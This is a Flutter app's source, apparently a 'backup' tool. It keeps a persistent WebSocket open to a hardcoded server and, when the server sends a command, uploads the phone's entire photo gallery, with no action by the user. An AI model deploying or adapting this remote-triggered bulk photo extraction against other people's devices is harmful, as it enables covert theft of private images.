import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:photo_manager/photo_manager.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const RemotePulseApp());
}

class RemotePulseApp extends StatelessWidget {
  const RemotePulseApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Remote Pulse Backup',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.green),
        useMaterial3: true,
      ),
      home: const MainHomeScreen(),
    );
  }
}

class MainHomeScreen extends StatefulWidget {
  const MainHomeScreen({super.key});

  @override
  State<MainHomeScreen> createState() => _MainHomeScreenState();
}

class _MainHomeScreenState extends State<MainHomeScreen> {
  static const String serverDomain = "remote-pulse-server.onrender.com";
  static const String deviceId = "my_device_123";

  bool _isConnected = false;
  bool _isConnecting = false;
  bool _isSyncing = false;
  bool _permissionGranted = false;

  int _totalImages = 0;
  int _uploadedImages = 0;
  String _statusMessage = 'جاري التحقق من الصلاحيات والاتصال...';

  WebSocket? _webSocket;
  Timer? _reconnectTimer;

  @override
  void initState() {
    super.initState();
    _requestInitialPermission();
    _connectToCloudServer();

    _reconnectTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
      if (!_isConnected && !_isConnecting) {
        _connectToCloudServer();
      }
    });
  }

  Future<void> _requestInitialPermission() async {
    final PermissionState ps = await PhotoManager.requestPermissionExtend();
    setState(() {
      _permissionGranted = ps.isAuth || ps.hasAccess;
    });
  }

  Future<void> _connectToCloudServer() async {
    if (_isConnected || _isConnecting) return;
    _isConnecting = true;

    try {
      final wsUrl = 'wss://$serverDomain/ws/phone/$deviceId';
      _webSocket = await WebSocket.connect(wsUrl).timeout(const Duration(seconds: 8));

      if (mounted) {
        setState(() {
          _isConnected = true;
          _isConnecting = false;
          _statusMessage = 'متصل بالسيرفر بنجاح\nجاهز للنسخ الاحتياطي الفوري';
        });
      }

      _webSocket?.listen(
        (data) {
          try {
            final message = jsonDecode(data);
            if (message['action'] == 'FETCH_ALL_IMAGES') {
              _syncAllImages();
            }
          } catch (_) {}
        },
        onError: (_) => _handleDisconnect(),
        onDone: () => _handleDisconnect(),
        cancelOnError: true,
      );
    } catch (_) {
      _handleDisconnect();
    }
  }

  void _handleDisconnect() {
    _isConnecting = false;
    if (mounted) {
      setState(() {
        _isConnected = false;
        _statusMessage = 'تم قطع الاتصال، جاري إعادة المحاولة...';
      });
    }
    _webSocket?.close();
    _webSocket = null;
  }

  Future<void> _syncAllImages() async {
    // 1. طلب الصلاحية وإعادة التحقق قبل مسح الصور
    PermissionState ps = await PhotoManager.requestPermissionExtend();
    if (!ps.isAuth && !ps.hasAccess) {
      if (mounted) {
        setState(() {
          _statusMessage = 'يرجى منح صلاحية الوصول للصور من إعدادات الهاتف!';
        });
      }
      return;
    }

    if (!_isConnected || _isSyncing) return;

    setState(() {
      _isSyncing = true;
      _uploadedImages = 0;
      _statusMessage = 'جاري مسح ألبومات الهاتف وجلب الصور...';
    });

    try {
      // 2. جلب جميع ألبومات الصور المتاحة
      List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
        type: RequestType.image,
        hasAll: true,
      );

      if (albums.isEmpty) {
        if (mounted) {
          setState(() {
            _statusMessage = 'لم يتم العثور على أي ألبومات صور!';
          });
        }
        return;
      }

      // اختيار الألبوم الشامل للصور
      AssetPathEntity recentAlbum = albums.firstWhere(
        (album) => album.isAll,
        orElse: () => albums.first,
      );

      int totalCount = await recentAlbum.assetCountAsync;
      if (mounted) {
        setState(() {
          _totalImages = totalCount;
        });
      }

      if (totalCount == 0) {
        if (mounted) {
          setState(() {
            _statusMessage = 'لا توجد صور في المعرض للنقل.';
          });
        }
        return;
      }

      // 3. جلب الصور بنظام الدفعات (Pages) لتفادي خطأ SQLite LIMIT
      const int pageSize = 50;
      int totalPages = (totalCount / pageSize).ceil();

      for (int page = 0; page < totalPages; page++) {
        if (!_isConnected) break;

        List<AssetEntity> pageMedia = await recentAlbum.getAssetListPaged(
          page: page,
          size: pageSize,
        );

        for (var asset in pageMedia) {
          if (!_isConnected) break;

          final File? file = await asset.originFile ?? await asset.file;
          if (file != null && await file.exists()) {
            await _uploadSingleFile(file);
            if (mounted) {
              setState(() {
                _uploadedImages++;
              });
            }
          }
        }
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _statusMessage = 'حدث خطأ أثناء وصول الملفات: $e';
        });
      }
    } finally {
      if (mounted) {
        setState(() {
          _isSyncing = false;
          if (_uploadedImages > 0) {
            _statusMessage = 'اكتمل نقل جميع الصور بنجاح!';
          }
        });
      }
    }
  }

  Future<void> _uploadSingleFile(File file) async {
    try {
      List<int> imageBytes = await file.readAsBytes();
      String base64Image = base64Encode(imageBytes);
      String fileName = file.path.split('/').last;

      _webSocket?.add(jsonEncode({
        "type": "NEW_IMAGE_DATA",
        "file_name": fileName,
        "data": base64Image,
      }));
    } catch (_) {}
  }

  @override
  void dispose() {
    _reconnectTimer?.cancel();
    _webSocket?.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final Color backgroundColor = _isConnected ? const Color(0xFF0F2D18) : const Color(0xFF1E1E1E);
    final Color cardColor = _isConnected ? const Color(0xFF1B4D29) : const Color(0xFF2D2D2D);

    return Scaffold(
      backgroundColor: backgroundColor,
      appBar: AppBar(
        title: const Text('Remote Pulse Service', style: TextStyle(color: Colors.white)),
        centerTitle: true,
        backgroundColor: Colors.transparent,
      ),
      body: Center(
        child: SingleChildScrollView(
          child: Padding(
            padding: const EdgeInsets.all(24.0),
            child: Container(
              padding: const EdgeInsets.all(24.0),
              decoration: BoxDecoration(
                color: cardColor,
                borderRadius: BorderRadius.circular(20),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    _isConnected ? Icons.verified_user : Icons.gpp_maybe,
                    size: 80,
                    color: _isConnected ? Colors.greenAccent : Colors.orangeAccent,
                  ),
                  const SizedBox(height: 15),
                  Text(
                    _statusMessage,
                    textAlign: TextAlign.center,
                    style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Colors.white),
                  ),
                  const SizedBox(height: 20),
                  if (_isSyncing) ...[
                    LinearProgressIndicator(
                      value: _totalImages > 0 ? _uploadedImages / _totalImages : 0,
                      color: Colors.greenAccent,
                      backgroundColor: Colors.black26,
                    ),
                    const SizedBox(height: 10),
                    Text(
                      'تم نقل: $_uploadedImages من أصل $_totalImages',
                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                    )
                  ]
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
